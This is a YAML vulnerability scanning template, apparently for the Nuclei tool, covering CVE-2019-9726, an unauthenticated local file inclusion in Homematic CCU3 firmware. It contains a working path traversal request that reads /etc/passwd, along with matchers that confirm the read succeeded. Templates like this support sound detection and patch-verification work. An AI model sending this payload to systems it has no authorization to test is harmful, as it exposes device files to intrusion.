id: CVE-2019-9726

info:
  name: Homematic CCU3 - Local File Inclusion
  author: 0x_Akoko
  severity: high
  description: eQ-3 AG Homematic CCU3 3.43.15 and earlier allows remote attackers to read arbitrary files of the device's filesystem, aka local file inclusion. This vulnerability can be exploited by unauthenticated attackers with access to the web interface.
  impact: |
    An attacker can exploit this vulnerability to read sensitive files on the system.
  remediation: |
    Apply the latest security patches or updates provided by the vendor.
  reference:
    - https://atomic111.github.io/article/homematic-ccu3-fileread
    - https://nvd.nist.gov/vuln/detail/CVE-2019-9726
    - https://github.com/ARPSyndicate/kenzer-templates
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.5
    cve-id: CVE-2019-9726
    cwe-id: CWE-22
    epss-score: 0.49616
    epss-percentile: 0.97738
    cpe: cpe:2.3:o:eq-3:ccu3_firmware:*:*:*:*:*:*:*:*
  metadata:
    max-request: 1
    vendor: eq-3
    product: ccu3_firmware
  tags: cve2019,cve,homematic,lfi,eq-3

http:
  - method: GET
    path:
      - "{{BaseURL}}/.%00./.%00./etc/passwd"

    matchers-condition: and
    matchers:
      - type: regex
        part: body
        regex:
          - "root:.*:0:0:"
          - "bin:.*:0:0:"
        condition: or

      - type: status
        status:
          - 200
# digest: 4a0a00473045022100d8309d830c6c7dcbbb54f2da19f81481495624688b2c1736b0dcd50d06e4c6260220647cb7b29381e2c50fda6b5eec7d21b832ea9b4c91253507d58a4cc0ee90a915:922c64590222798bb761d5b6d8e72950